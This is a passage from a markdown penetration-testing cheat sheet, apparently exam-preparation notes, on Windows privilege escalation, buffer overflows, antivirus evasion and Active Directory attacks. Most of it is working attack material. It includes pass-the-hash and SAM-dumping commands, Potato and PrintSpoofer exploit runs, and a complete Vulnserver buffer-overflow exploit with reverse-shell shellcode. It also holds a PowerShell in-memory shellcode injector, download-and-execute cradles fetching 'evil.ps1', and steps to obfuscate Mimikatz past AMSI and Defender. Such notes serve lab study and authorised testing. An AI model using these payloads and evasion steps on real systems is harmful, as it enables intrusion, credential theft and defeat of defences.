   - also run `.\winPEASx64.exe windowscreds filesinfo fileanalysis searchpf log=winpeas_out.txt`

**Security Account Manager (SAM)**
1. The `SAM` and `SYSTEM` files can be used to extract user password hashes. Check also backups of these files
   - `copy C:\Windows\Repair\SAM \\<IP>\kali\`
   - `copy C:\Windows\Repair\SYSTEM \\<IP>\kali\`
2. Dump the hashes with "creddump7": `python3 creddump7/pwdump.py SYSTEM SAM`
3. Crack the hashes with `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

**Passing The Hash**
1. Use the hashes to authenticate: `pth-winexe -U 'admin%hash' //<IP Victim> cmd.exe`

#### <ins>Scheduled Tasks</ins>

1. List all scheduled tasks your user can see:
   - `schtasks /query /fo LIST /v`
   - In PowerShell: `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
2. Search in Task Manager for any scheduled task
   1. See if you find any `.ps1` script.
      - If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
      - Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
   2. For the `.exe`, review the permissions with `icals C:\Users\Documents\service.exe`
      - If you have full access permissions, substitute the `.exe` as in the section [Insecure File Permissions](#insecure-file-permissions)


#### <ins>Insecure GUI Apps</ins>
1. Open an app. Look at the privilege level it runs with `tasklist /V | findstr mspaint.exe`
2. If the app runs with admin privileges and gives the possibility to open a file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`

#### <ins>Startup Apps</ins>
1. Note if `BUILTIN\Users` group can write files to the StartUp directory: `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. Using cscript, run the following script to create a new shortcut of the reverse shell executable in the StartUp directory:
   - ```VBScript
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
     oLink.Save
     ```

#### <ins>Installed Applications</ins>
1. Manually enumerate all running programs: `tasklist /v`
   - With seatbelt: `.\seatbelt.exe NonstandardProcesses`
   - With winPEAS: `.\winPEASany.exe quiet procesinfo`
2. Search for the applications' versions
   - Try running the executable with `/?` or `-h,` as well as checking config or text files in the `Program Files` directory
3. Use Exploit-DB to search for a corresponding exploit

#### <ins>Hot Potato</ins>
Note: This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
1. See [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato), get the exploit [here](https://github.com/foxglovesec/Potato)
2. Start a listener on the attacker machine
3. Run the exploit: `.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
4. Wait for a Windows Defender update (or trigger one manually)

#### <ins>Token Impersonation</ins>


**[RoguePotato](https://github.com/antonioCoco/RoguePotato)**
1. See [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
2. Set up a socat redirector on the attacker machine, forwarding its port 135 to port 9999 on Windows `sudo socat tcp-listen:135,reuseaddr,fork tcp:<Windows IP>:9999`
3. Execute the PoC: `.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999`
4. Check [Juicy Potato](https://github.com/ohpe/juicy-potato), it's an improved version

**More Potatoes**
- See: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**
- Usage 1
  1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
  3. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
- Usage 2
  1. Copy the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. `.\PrintSpoofer64.exe -i -c powershell.exe`

**metasploit**
- msfconsole, meterpreter > load incognito
  - `list_tokens -u`
  - `impersonate_token domain\\username`
  - `rev2self <# to reverte to initial user, usefull when the initial user is the admin #>`

#### <ins>getsystem</ins>
- **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
- **Impersonation Access Token**: When a process or thread momentarily needs to run with another user's security context, this object is created.
- **Token Duplication**: Windows permits processes and threads to use multiple access tokens. This allows for the duplication of an impersonation access token into a main access token. If we have the ability to inject into a process, we can leverage this feature to copy the process's access token and launch a new process with the same rights.
- **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)

#### <ins>Pass The Hash</ins>
- You can pass NTLM hashes, not NTLMv2
- `pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
- `crackmapexec smb 10.0.3.0/24 -u fcastle -H eb7126ae2c91ed5637hdn3hegve38928398 --local-auth`
- `crackmapexec winrm 192.168.174.175 -u usernames.txt -H hashes.txt --local-auth`
- `evil-winrm -i 192.168.174.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
- `impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <USERNAME>:@<IP>`
- `impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175`
- with sam hashes, remember to use the correct pair
- https://labs.withsecure.com/publications/pth-attacks-against-ntlm-authenticated-web-applications


#### <ins>Pass The Password</ins>
- `crackmapexec smb 10.0.3.0/24 -u fcastle -d DOMAIN -p Password1`
- `crackmapexec smb 192.168.220.240 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --sam`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --lsa`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --ntds`


#### <ins>Apache lateral movement</ins>
- If you have logged in with an user, and you see the apache user, you might try to move laterally and from that user try to escalate
- check if you have write access to 'C:\xampp\htdocs' with `echo testwrite > testdoc.txt`
- if you have write privileges, download a cmd.php shell and check who the user is. If it's apache, do a reverse shell


#### <ins>Read data stream</ins>

maybe you are in a directory where there is something strange

1. use `dir /r`
   you might find files like the following
   ```
   hm.txt
   hm.txt:root.txt:$DATA
   ```
2. Use the following command
   `powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- See Hack The Box - Jeeves


#### <ins>PrintNightmare</ins>
- `impacket-rpcdump @10.10.108.190 | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
    1. `msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.18.110.121 LPORT=447 -f dll > shell.dll`
    2. `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
    4. Set a listener: `msfconsole -q`, `use multi/handler`
    3. `python3 '/home/kali/Documents/windows-attack/CVE/PrintNightmare/CVE-2021-1675/CVE-2021-1675.py' VULNNET/enterprise-security:'sand_0873959498'@10.10.198.52 '\\10.18.110.121\share\shell.dll'`
  - For just a Priv Esc, use https://github.com/calebstewart/CVE-2021-1675
- See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare


#### <ins>Bypass CLM / CLM breakout | CLM / AppLocker Break Out</ins>
- Verify that you are in a contained enviorment with
  - `$executioncontext.sessionstate.languagemode`
  - `Get-AppLockerPolicy -Effective -XML`
  - see https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://github.com/padovah4ck/PSByPassCLM
- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
- Msbuild: https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
           https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html


#### <ins>From Local Admin to System</ins>
- If you are part of the group "Administrators", try: `.\PsExec.exe -i -s -d -accepteula cmd`


#### <ins>TeamViewer</ins>
- TeamViewer 7 vulnerable to CVE-2019-18988
  - https://whynotsecurity.com/blog/teamviewer/
  - use post/windows/gather/credentials/teamviewer_passwords


#### <ins>Exploiting service through Symbolic Links</ins>
A symbolic link is a file object that points to another file object. The object being pointed to is called the target.
- create a Mount Point: `./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`
  - In this way, a script that copies `request.log` will copy `id_rsa` instead
  - see proving-grounds/Symbolic


#### <ins>Write privileges</ins>

- If you can write on `C:\Windows\System32\`, try these:
  - https://github.com/sailay1996/WerTrigger
  - https://github.com/binderlabs/DirCreate2System



#### <ins>Services running - Autorun</ins>

- Usa tasklist: `tasklist /svc`
- `netstat -ano`
- See non-default services running
  - `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
- See if there are any autorun applications outside the normal paths (like `C:\app`)
  - `wmic service get name,displayname,pathname,startmode |findstr /i "auto"`
  - See CVEs for privilege escalation
  - If there is an insecure folder permission, you could delete the exe that starts and replace it.
    - Check it with: `sc qc SERVICENAME`
  - once done, run `shutdown /r`
- To see the values corresponding to a PID: `tasklist /svc /FI "PID eq 9833"`
- Other ways to see running services: `Get-Service, wmic.exe, service get name, sc.exe query state= all, net.exe stat, Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE`



#### <ins>CEF Debugging Background</ins>
- Example: `Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7`
- https://github.com/taviso/cefdebug
-  https://twitter.com/taviso/status/1182418347759030272
- See the process: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#priv-tushikikatomo--cyork


#### <ins>Feature Abuse</ins>

Note: In the Windows environment, numerous enterprise applications often require either administrative privileges or SYSTEM privileges, presenting significant opportunities for privilege escalation.

##### Jenkins
You can run system commands. There are many ways to do it:
- With plugins installed (from [CRTP](https://www.alteredsecurity.com/adlab))
- With admin access, go to `http://<jenkins_server>/script` and run the following:
  ```PowerShell
  def sout = new StringBuffer(), serr = new StringBuffer()
  def proc = '
  [INSERT COMMAND]'.execute()
  proc.consumeProcessOutput(sout, serr)
  proc.waitForOrKill(1000)
  println "out> $sout err> $serr"
  ```
- If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: `powershell -c <command>`



### <ins>Buffer Overflow</ins>

**Tools**
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) + [mona](https://github.com/corelan/mona)
- [Vulnserver](https://thegreycorner.com/vulnserver.html)
  - Note: usually, `<port vulnserver>` is `9999`
- [Kali](https://www.kali.org/)
- See also [Buffer Overflows Made Easy | The Cyber Mentor](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
- [mingw-w64](https://www.mingw-w64.org/), a cross-compiler for programs written to be compiled in Windows. With it you can compile them in an OS like Linux
  - Example of usage: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- See also: [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)

**Issues**
- ["Problems attach Immunity to Vulnserver on Windows 10"](https://www.reddit.com/r/hacking/comments/ohg5t0/problems_attach_immunity_to_vulnserver_on_windows/): Don't start vulnserver, start Immunity as Admin, File > Open > vulnserver.exe, push "play".

**Steps to conduct a Buffer Overflow**
1. [Spiking](#spiking)
2. [Fuzzing](#fuzzing)
3. [Finding the Offset](#finding-the-offset)
4. [Overwriting the EIP](#overwriting-the-eip)
5. [Finding bad characters](#finding-bad-characters)
6. [Finding the right module](#finding-the-right-module)
7. [Generating Shellcode](#generating-shellcode)

#### <ins>Spiking</ins>

`generic_send_tcp <IP Vulnserver> <port vulnserver> script.spk 0 0`

**Example: trun.spk**
```spike
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

#### <ins>Fuzzing</ins>

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('<IP Vulnserver>', <port vulnserver>))
        s.send(('TRUN /.:/' + buffer).encode())
        s.close()
        sleep(1)
        buffer += "A" * 100
    except:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

#### <ins>Finding the Offset</ins>

1. Get the result from: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_where_server_crashed>`
2. Modify the previous script in
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   offset = "RESULT_FROM_STEP_1"
   
   while True:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(('<IP Vulnserver>', <port vulnserver>))
           s.send(('TRUN /.:/' + offset).encode())
           s.close()
       except:
           print ("Error connecting to the server")
           sys.exit()
   ```
3. After running the script, read the value from the EIP
4. With that value, run this script: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_VALUE_STEP_2`

#### <ins>Overwriting the EIP</ins>

From the previous result, we should get the position `2003` for the start of the EIP. We can test this by sending `A * 2003` plus `B * 4` and see if `EIP = 42424242` (since `42424242` = `BBBB`).

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode).encode())
		s.close()
	except:
		print ("Error connecting to the server")
		sys.exit()
```

#### <ins>Finding bad characters</ins>

You can generate a string of bad chars with the following python script
```Python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

The following python script is used to find bad chars
```python
#!/usr/bin/python3
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	except:
		print "Error connecting to the server"
		sys.exit()
```

1. After starting the script, once vulnserver breaks down, go in Immunity `Debugger` > `Registers` > Right-click on `ESP` > `Follow in Dump` > See `Hex dump`. 
2. Check if the Hex dump makes sence, e.g. in the Hex dump there is no number value missing.
   - Example: you may get a result like `... 01 02 03 B0 B0 06 07 08 ...`. As you can see, `04` and `05` are missing, so you've found a bad character.
3. Write down every character missing

Another solution to the step `3.`, with mona and Immunity Debugger
1. Set the working directory with `!mona config -set workingfolder c:\mona`
2. Generate bad characters with `!mona bytearray -cpb "\x00"` from Immunity Debugger
   -  Notice the new files in `c:\mona`
3. Run the python script of this section
4. Execute the command `!mona compare -f c:\mona\bytearray.bin -a <address of ESP>`
- Note: this may cause false positive

#### <ins>Finding the right module</ins>

Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` we can get the hex equivalent to these commands.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

On Immunity, using mona, type
1. `!mona modules` to get the module to use, one with no memory protection for vulneserver. In this case, `essfunc.dll`.
2. `!mona jmp -r ESP -m "essfunc.dll"` to find the jump address
3. See the entries in `[+] Results:`

#### <ins>Generating Shellcode</ins>

1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
   - Always note the payload size
   - `-b` is for the badchars identified
2. See the following script
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   overflow = () # HERE INSERT THE RESULT FROM THE STEP 1, THE VALUE IN `unsigned char buf[]`
                 # Before every line insert `b`, this will say to bytencode the string
   
   shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow
   
   while True:
   	try:
   		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   		s.connect(('<IP Vulnserver>', <port vulnserver>))
   		s.send((b'TRUN /.:/' + shellcode))
   		s.close()
   	except:
   		print ("Error connecting to the server")
   		sys.exit()
   ```
   - "\xaf\x11\x50\x62" is the jump address found for this example `625011af` in reverse
   - `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
3. Use the command `nc -nvlp 4444`
4. Run the script, notice the shell in netcat


## Antivirus Evasion

- With powershell, use `-e` or `-enc` with an encoded command in base64
- See more here: [Section 14: Antivirus Bypassing](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-14-antivirus-bypassing)
- Try not running exe on disk, for example `cmd /c \\192.168.45.182\Share\nc.exe -i cmd.exe 192.168.45.182 448`

### <ins>ToDo</ins>
- Discover the AV in the machine of the victim
- Create a VM that resembles the victim's machine
- Make sure to disable sample submission 
  - `Windows Security` > `Virus & threat protection` > `Manage Settings` > `Automatic Sample Submission`
- As last resort, check the malware created with
  - [VirusTotal](https://www.virustotal.com/)
  - [AntiScan.Me](https://antiscan.me/)

### <ins>With Evil-WinRM</ins>
1. `*Evil-WinRM* PS C:\programdata> menu`
2. `*Evil-WinRM* PS C:\programdata> Bypass-4MSI`

### <ins>Thread Injection</ins>

1. Write this In-memory payload injection PowerShell `.ps1` script, from [PEN-200](https://www.offsec.com/courses/pen-200/)
   ```PowerShell
   <# Importing Windows APIs in PowerShell #>
   $code = '
   [DllImport("kernel32.dll")]
   public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
   [DllImport("kernel32.dll")]
   public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
   [DllImport("msvcrt.dll")]
   public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
  
   <# Memory allocation and payload writing using Windows APIs in PowerShell #>
   $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
   [Byte[]];
   [Byte[]] $var1 = <SHELLCODE-HERE>;
   $size = 0x1000;
   if ($var1.Length -gt 0x1000) {$size =  $var1.Length};
   $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
   for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
   
   <# Calling the payload using CreateThread #>
   $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
   ```
  
2. Generate a PowerShell compatible payload
   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f powershell`
3. Insert the result in `[Byte[]] $var1` in the PowerShell Script
4. Change the ExecutionPolicy for current user
   ```PowerShell
   PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
   PS C:\> Get-ExecutionPolicy -Scope CurrentUser
   ```
5. Set up a handler to interact with the meterpreter shell
     ```PowerShell
     msf exploit(multi/handler) > show options   <# Set the correct values #>
     msf exploit(multi/handler) > exploit
     ```
6. Run the PowerShell script
   - You can also decide to convert the script in base64 with [ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) and run it with `powershell.exe -e <BASE64>`
8. Get the meterpreter shell on the attacking machine

### <ins>Shellter</ins>

Note
- [An important tip for Shellter usage](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)

Example of usage
1. Select Auto mode with `A`
2. Selecting a target PE in shellter and performing a backup, in this case the WinRAR installer: `/home/kali/Desktop/winrar-x32-621.exe`
3. Enable stealth mode with `Y`
4. Select a listed payload with `L`
5. Select `meterpreter_reverse_tcp` with `1`
6. Set `LHOST` and `LPORT`
7. Create a listener in Kali with Metasploit
   - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
8. Get the meterpreter shell on the attacking machine


### <ins>Active Directory</ins>

#### <ins>Notes</ins>

| Server | Algorithm available |
| ---    | ---                 |
| Windows 2003 | NTLM |
| Windows Server 2008 or later | NTLM and SHA-1 |
| - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |

When you compromise a Domain Controller, you want to be able to get the ntds.dit file
- Contains password hashes
- ticket attack, pass the hash attack, crack the password etc
- generally stored in %SystemRoot%\NTDS


**Cheat sheets**
- [cheatsheet-active-directory.md](https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md)
- [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Section 18: Active Directory Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-18-active-directory-attacks)
- [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
- [WADComs](https://wadcoms.github.io/)

**Common Terminology**
- AD Component: trees, forest, domain tree, domain forest
  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
- https://tryhackme.com/room/attackingkerberos  Task 1
- More resources:
  https://tryhackme.com/room/attackingkerberos  Task 9

**ACEs**
- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`


**Services that can be configured for delegation**
- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.


**Basics commands**
- Perform a password reset
  - `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`
- Make user change password next logon
  - `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose`

**Work with modules and scripts**

Import a `.psd1` script (get all the commands from a module with `Get-Command -module <name-module>`)
- `Import-Module script.psd1`
- `iex (New-Object Net.WebClient).DownloadString('https://IP/payload.ps1')`
- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://IP/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
- PSv3 onwards: `iex(iwr 'http://IP/evil.ps1')`
- `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://IP/evil.ps1',$false);$h.send();iex $h.responseText`
- `$wr = [System.NET.WebRequest]::Create("http://IP/evil.ps1")`<br/>
  `$r = $wr.GetResponse()`<br/>
  `IEX (System.IO.StreamReader).ReadToEnd()`

PowerShell Detections
- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

PowerShell Detections bypass
- Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected as malicious: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
- [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag: `DefenderCheck.exe PowerUp.ps1`
- For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Steps to avoid signature based detection:
1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

For Mimikatz, make the following changes:
1. Remove default comments
2. Rename the script, function names and variables
3. Modify the variable names of the Win32 API calls that are detected
4. Obfuscate PEBytes content → PowerKatz dll using packers (tool: [ProtectMyTooling](https://github.com/mgeeky/ProtectMyTooling))
5. Implement a reverse function for PEBytes to avoid any static signatures
6. Add a sandbox check to waste dynamic analysis resources
7. Remove Reflective PE warnings for a clean output
8. Use obfuscated commands for Invoke-MimiEx execution
9. Analysis using DefenderCheck

**Good OPSEC**
- It’s better to use a Windows OS to increase stealth and flexibility.
- Always make sure to use a LDAP based tools, never .NET commands (SAMR)
- Always enumerate first, do not grab the low hanging fruit first, since it may be a decoy. Also check logon count and login policy.
  - An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
  - Check: logonCount, lastlogontimestamp, badpasswordtime, Description
  - Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?
- Making changes to the local administrator group is one of the noisiest things you can do

**Misc notes**
- Check for `Domain Admins` and `Service Accounts` groups
- Add an account to a group
  - `net group "<group>" <user> /add /domain`
  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
  - Delete the `<user>` with `/del` instead of `/add`
- Use `gpp-decrypt` to decrypt a given GPP encrypted string
- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- If you get lost, see the notes for the Hutch, Heist, and Vault machines
- File config for responder: `/usr/share/responder/Responder.conf`
- Do password spray only on local account
  - `Rubeus.exe brute /password:Password1 /noticket`
    - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
- To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
- Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
  - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
- NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
